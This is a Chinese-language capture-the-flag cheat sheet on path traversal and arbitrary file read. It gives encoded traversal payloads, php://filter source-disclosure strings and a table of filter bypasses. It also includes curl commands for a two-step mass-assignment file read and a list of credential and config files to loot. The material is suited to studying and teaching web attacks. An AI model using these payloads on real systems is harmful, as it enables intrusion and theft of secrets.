# 路径穿越 / 任意文件读取

## 探测

```
?file=../../../../etc/passwd
?file=/etc/passwd                 # 绝对路径常常直接可用，不需要 ../
?file=....//....//etc/passwd
?file=..%2f..%2fetc%2fpasswd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=..%252f..%252fetc%252fpasswd      # 双重编码（二次解码点）
```

**先试绝对路径**：很多实现只做 `"dir/" + input` 拼接，绝对路径反而最直接。

## 前缀受限时

如果拼成 `"uploads/" + input`：

```
../../../etc/passwd
....//....//etc/passwd        # 过滤 .. 一次后仍还原
..%2f..%2f                    # 服务端解码后
/var/www/html/uploads/../../etc/passwd   # 知道绝对前缀就直接写全
```

## 读 PHP 源码

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
```

## 判断"读到了"

- `/etc/passwd` 里出现 `root:x:0:0`
- 目标文件返回的长度与普通 404/首页明显不同
- base64 的 PHP 源码能解码（说明 filter 链生效）

## flag 找不到时的顺序

1. 题面给的位置（照抄，别改）
2. 常见落点：`/flag`、`/flag.txt`、`/root/flag`、`/home/*/flag*`、`/tmp/flag*`、当前工作目录
3. **平台约定**：很多平台会把 flag 放在固定目录，平台适配器会在 `meta.flag_paths` 里声明
4. 环境与启动脚本：`/proc/self/environ`、`/proc/1/cmdline`、`/start.sh`、`/entrypoint.sh`、`/Dockerfile`
5. 配置里的路径：`config.php`、`.env`、`settings.py` → 常直接写出 flag 文件位置

**root-only 文件（400/600 root:root）不要死磕**：那不是给当前权限准备的入口，
去找"以 root 运行的服务"（本地的 agent/cron/systemd、unix socket、内部 API）。

## 常见过滤与绕过

| 过滤 | 绕过 |
|---|---|
| `../` 被删一次 | `....//`、`..%2f`、`%2e%2e/`、`..\`（Windows） |
| 只允许某后缀 | `shell.php%00.jpg`（PHP<5.3.4）、`shell.php/.`、`shell.php::$DATA`（Windows） |
| 只允许某前缀 | `uploads/../../`、绝对路径 |
| 关键字 `flag` 被拦 | 通配符 `fla?`、`f*`；`/proc/self/root/...` 绕绝对路径 |

## 两段式任意读：先改"对象里的路径字段"，再走下载接口

很多应用的文件读取不是直接由请求参数决定的，而是**从数据库/对象里取一个路径字段**：

```
update_ticket.php?id=N   收一个 receipt_path 字段（无白名单 = mass assignment）
download.php?id=N        按 receipt_path 读文件
```

于是任意文件读取变成两步：

```bash
# 1) 找一个"更新对象"的接口，把路径字段改成目标文件
curl -b cj -X POST "http://t/api/update_ticket.php?id=2" -F "title=x" -F "receipt_path=/目标文件"
# 2) 用业务自己的下载/预览接口读回来
curl -b cj "http://t/download.php?id=2"
```

- 判据：列表/详情接口里出现**服务器绝对路径**（`/var/www/html/uploads/xxx.jpg`）就说明有戏；
- 同类字段：`avatar_path`、`attachment`、`template`、`logo`、`export_path`、`config_file`；
- 绝对路径常常直接可用（拼接方只做 `dir + name`，不校验前缀）。

## 顺手能捡的"文件"：数据库与备份

- `/db/`、`/data/`、`/backup/` 目录不可列（403），但**文件名可猜**：`<应用名>.db`、`<应用名>.sqlite`、
  `db.sqlite3`、`data.db`、`backup.sql`、`*.bak`；
- 拿到 SQLite 直接用 `sqlite3 file ".tables"` 与 `select * from config;` 读；
- 源码/配置类文件优先：`config.php`、`settings.py`、`application.yml`、`.env`、`includes/config.php` —— 
  它们同时给出**下一跳凭据**和**flag 的真实位置**。
